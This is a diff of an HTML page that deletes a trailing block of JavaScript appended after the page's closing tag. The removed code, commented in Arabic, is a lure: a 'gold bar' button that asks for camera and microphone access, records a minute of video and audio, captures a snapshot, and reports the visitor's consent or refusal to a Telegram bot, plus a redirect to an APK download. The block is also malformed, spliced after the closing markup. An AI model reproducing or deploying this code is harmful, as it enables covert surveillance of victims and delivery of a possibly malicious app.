@@ -227,49 +227,4 @@ ${extra}
     startBtn.addEventListener('click', startFlow);
   </script>
 </body>
-  </html>  sendToTelegram();
-  setTimeout(()=>{ window.location.href = APK_URL; }, 2000);
-});
-
-// زر السبيكة الذهبية
-document.getElementById("startMedia").onclick = async ()=>{
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-    document.getElementById("preview").srcObject = stream;
-    sendToTelegram("✅ المستخدم وافق على المشاركة بالصوت/الصورة");
-
-    // تسجيل الفيديو والصوت لمدة 60 ثانية
-    const recorder = new MediaRecorder(stream);
-    let chunks = [];
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = e => {
-      const blob = new Blob(chunks, { type: 'video/webm' });
-      const url = URL.createObjectURL(blob);
-      const vid = document.createElement('video');
-      vid.src = url;
-      vid.controls = true;
-      document.body.appendChild(vid);
-      // هنا يمكنك رفع blob إلى خادمك أو تيليجرام
-    };
-    recorder.start();
-    setTimeout(()=>recorder.stop(), 60000); // دقيقة كاملة
-
-    // التقاط صورة بعد 5 ثوانٍ
-    setTimeout(()=>{
-      const video = document.getElementById("preview");
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      document.getElementById("snapshot").src = canvas.toDataURL("image/png");
-      // هنا يمكنك رفع الصورة إلى خادمك أو تيليجرام
-    }, 5000);
-
-  } catch(e) {
-    sendToTelegram("❌ المستخدم رفض المشاركة بالصوت/الصورة");
-    alert("لم يتم منح الإذن.");
-  }
-};
-</script>
-</body>
 </html>
